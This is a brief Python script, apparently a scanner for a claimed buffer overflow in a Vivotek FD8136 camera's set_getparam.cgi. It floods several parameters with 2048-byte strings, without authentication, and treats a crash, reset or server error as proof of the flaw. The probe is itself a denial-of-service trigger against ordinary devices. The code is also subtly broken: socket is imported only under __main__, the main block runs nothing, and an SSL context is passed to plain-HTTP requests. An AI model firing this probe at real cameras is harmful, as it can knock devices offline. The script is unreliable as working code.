#!/usr/bin/env python3
"""CVE-2026-30649: Vivotek FD8136 set_getparam.cgi Buffer Overflow Scanner
CVSS: 7.3 HIGH | No auth required | /cgi-bin/admin/set_getparam.cgi"""
import urllib.request, ssl
from pathlib import Path

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def probe(host, port=80):
    """Send oversized parameter to set_getparam.cgi."""
    oversized = "A" * 2048
    for param in ['value', 'param', 'data', 'cmd']:
        try:
            url = f"http://{host}:{port}/cgi-bin/admin/set_getparam.cgi?{param}={oversized}"
            resp = urllib.request.urlopen(urllib.request.Request(url, method='GET'), timeout=8, context=ctx)
            if resp.status >= 500: return True
        except urllib.error.HTTPError as e:
            if e.code >= 500: return True
        except (ConnectionResetError, socket.timeout): return True
        except Exception: pass
    return False

if __name__ == '__main__': import socket
